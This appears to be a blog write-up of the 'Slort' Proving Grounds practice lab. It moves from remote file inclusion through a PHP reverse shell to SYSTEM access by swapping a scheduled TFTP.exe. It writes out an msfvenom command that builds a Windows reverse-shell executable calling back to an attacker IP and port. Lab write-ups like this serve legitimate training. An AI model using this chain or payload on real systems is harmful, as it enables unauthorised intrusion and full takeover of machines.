---
layout: post
title: "Slort - Proving Grounds Practice"
summary: "Directory Brute Force → allow_url_include → page parameter Remote File Inclusion (RFI) → save PHP reverse shell as txt → user shell → scheduled task on writeable file → msfvenom to generate malicious file → Administrator"
---

# Slort - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed FTP, SMB and HTTP 8080 ports were open.

<img width="802" height="627" alt="Image" src="https://github.com/user-attachments/assets/ff460f47-9d12-4c1e-b65c-0c2244728076" />

### Web Enumeration
At first I visited the website but it only showed default xampp page. Then I applied directory brute forcing and found `/site` endpoint.

<img width="954" height="778" alt="Image" src="https://github.com/user-attachments/assets/5e57ebb4-4ef3-4a2c-b718-3324fb0fcf01" />

Visiting the website I found `?page` parameter which seemed suspicious.

<img width="1294" height="782" alt="Image" src="https://github.com/user-attachments/assets/1a618b9f-00cf-40a1-accc-7b38828c5306" />

## Exploitation
### Remote File Inclusion (RFI)
Later, I tried RFI and it worked.

<img width="1126" height="589" alt="Image" src="https://github.com/user-attachments/assets/6e5bc813-453e-409c-85c5-f2208495967a" />

It worked because `allow_url_include` parameter was enabled.

<img width="1291" height="307" alt="Image" src="https://github.com/user-attachments/assets/3c06d974-017c-4470-98b4-c061f2e5bafe" />

I then downloaded [ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell/) and changed it to txt file (RFI to RCE) and updated IP value.

<img width="1097" height="616" alt="Image" src="https://github.com/user-attachments/assets/269b2a94-e012-41cd-bbda-9b861f25a8e2" />

And I got user shell.

<img width="1026" height="424" alt="Image" src="https://github.com/user-attachments/assets/97e3c68a-f073-4f19-ad77-c883be07868c" />

I then simply read the user flag.

<img width="586" height="427" alt="Image" src="https://github.com/user-attachments/assets/cb25a5df-9c60-499a-a776-51dec486e481" />

## Privilege Escalation
### Scheduled Tasks
There was a Backup folder and inside it there were three different files. `info.txt` stated that `TFTP.exe` is executed every 5 minutes.

<img width="590" height="413" alt="Image" src="https://github.com/user-attachments/assets/6b6a74bc-de8c-4c52-8548-26f35f592157" />

So I created a reverse shell using `msfvenom`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.210 LPORT=4444 -f exe -o exp.exe
```

<img width="885" height="413" alt="Image" src="https://github.com/user-attachments/assets/211b8bb8-bf42-46f4-b24a-454c854925fb" />

Then I transfered the file as TFTP.exe and setup a netcat listener and waited for 5 minutes.

<img width="720" height="339" alt="Image" src="https://github.com/user-attachments/assets/f3c574f8-b05c-4b24-9c01-dcfdd8dc5e65" />

I simply obtained SYSTEM shell.

<img width="689" height="448" alt="Image" src="https://github.com/user-attachments/assets/6c6adb88-e72a-412d-82ac-0d69976f61e7" />
